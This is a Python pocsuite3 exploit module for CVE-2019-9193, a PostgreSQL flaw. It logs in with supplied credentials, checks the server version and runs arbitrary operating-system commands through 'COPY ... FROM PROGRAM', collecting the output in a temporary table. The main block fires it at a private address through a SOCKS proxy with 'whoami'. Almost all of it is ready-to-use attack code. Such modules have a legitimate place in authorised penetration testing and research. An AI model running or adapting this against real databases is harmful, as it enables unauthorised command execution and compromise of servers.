import hashlib
import time
from abc import ABC
from collections import OrderedDict

import psycopg2

from pocsuite3.api import logger, POCBase
from pocsuite3.lib.core.interpreter_option import OptString


class Exploit(POCBase, ABC):
    cve = "CVE-2019-9193"
    name = "Postgresql 高权限命令执行漏洞"
    vulDate = "2023-02-24"
    appName = "Postgresql"
    vulType = "Remote Code Execute"
    OPTIONS = OrderedDict({"url": OptString("url", "目标URL"),
                           "username": OptString('postgres', "用户名"),
                           "password": OptString('postgres', "密码"),
                           "database": OptString('id', "数据库"),
                           "command": OptString('id', "自定义执行指令"), })

    @staticmethod
    def deserialize(record):
        result = ""
        for rec in record:
            result += rec[0] + "\r\n"
        return result

    def checkVersion(self, connection):
        cursor = connection.cursor()
        cursor.execute("SELECT version()")
        record = cursor.fetchall()
        cursor.close()
        result = self.deserialize(record)
        version = float(result[(result.find("PostgreSQL") + 11):(result.find("PostgreSQL") + 11) + 4])
        if version >= 9.3:
            logger.info("Postgres {0} is likely vulnerable".format(version))
            return True
        else:
            logger.warning("[-] Postgres {0} may not vulnerable".format(version))
            return False

    def _verify(self):
        username = self.get_option('username')
        password = self.get_option('password')
        connection = psycopg2.connect(
            user=username,
            password=password,
            host=self.host,
            port=self.port,
            connect_timeout=self.get_option('timeout', 6)
        )
        if self.checkVersion(connection):
            return self.parse_output({"VerifyInfo": {"URL": self.url}})

    @staticmethod
    def randomizeTableName():
        return "_" + hashlib.md5(time.ctime().encode('utf-8')).hexdigest()

    def _attack(self):
        username = self.get_option('username')
        password = self.get_option('password')
        connection = psycopg2.connect(
            user=username,
            password=password,
            host=self.host,
            port=self.port,
            connect_timeout=self.get_option('timeout', 6)
        )
        if self.checkVersion(connection):
            cursor = connection.cursor()
            tableName = self.randomizeTableName()
            command = self.get_option('command')
            try:
                logger.debug("[+] Creating table {0}".format(tableName))
                cursor.execute(
                    r"""DROP TABLE IF EXISTS {1};CREATE TABLE {1}(cmd_output text);COPY {1} FROM PROGRAM '{0}';SELECT * FROM {1};""".format(
                        command, tableName))
                logger.info("CMD:{}".format(command))
                record = cursor.fetchall()
                result = self.deserialize(record)
                logger.debug("[+] Deleting table {0}\r\n".format(tableName))
                cursor.execute("DROP TABLE {0};".format(tableName))
                cursor.close()
                return self.parse_output({"content": result})
            except psycopg2.errors.ExternalRoutineException as e:
                logger.debug("[-] Command failed : {0}".format(e.pgerror))
                cursor = connection.cursor()
                cursor.execute("DROP TABLE {0};".format(tableName))
                cursor.close()


if __name__ == "__main__":
    import logging, os

    os.environ.setdefault('http', 'socks5://127.0.0.1:10810')
    os.environ.setdefault('http', 'socks5://127.0.0.1:10810')
    exp = Exploit()
    exp.set_option('url', 'http://10.13.10.104:5432')
    exp.set_option('command', 'whoami')
    exp.execute('attack', debug=True)
